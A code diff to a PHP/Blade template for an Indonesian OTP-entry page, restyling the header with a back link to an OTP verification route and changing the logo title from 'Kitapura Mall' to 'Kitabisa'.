@@ -219,14 +219,20 @@
 		</style>
 	</head>
 	<body style="margin: 0px; background: #fb036b;">
-		<header class="style__Container-sc-3fiysr-0 header">
-			<div class="style__Wrapper-sc-3fiysr-2 hBSxmh" style="display: flex; justify-content: center;">
-				<a id="defaultheader_logo" title="Kitapura Mall" href="/">
-					<img src="<?=url('/')?>/public/img/logo.svg">&nbsp;
-					<img src="<?=url('/')?>/public/img/logo_text.svg">
-				</a>
-			</div>
-		</header>
+	    <header class="style__Container-sc-3fiysr-0 header">
+	        <div class="style__Wrapper-sc-3fiysr-2 hBSxmh" style="display: flex; justify-content: space-between;">
+	            <a href="<?=url('/')?>/verifikasi-otp/{{Request::segment(2)}}" style="padding-left: 1em;">
+	                <img src="<?=url('/')?>/public/img/back_white.svg">
+	            </a>
+	            <a id="defaultheader_logo" title="Kitabisa" style="margin-left: 20px; height:33px;margin-right:20px" href="/">
+	                <img src="<?=url('/')?>/public/img/logo.svg">
+	                <img src="<?=url('/')?>/public/img/logo_text.svg">
+	            </a>
+	            <div style="margin-right: 2.5em;">
+	                <img src="<?=url('/')?>/public/img/back.svg" hidden>
+	            </div>
+	        </div>
+	    </header>
 
 		<div class="wrapper" style="background: #fb036b; margin-top: 8em; display: flex; flex-direction: column; justify-content: center;">
 			<div style="text-align: center; width: 100%; margin-bottom: 0.3em; color: white;">Masukan <b>Kode OTP</b> kamu disini</div>
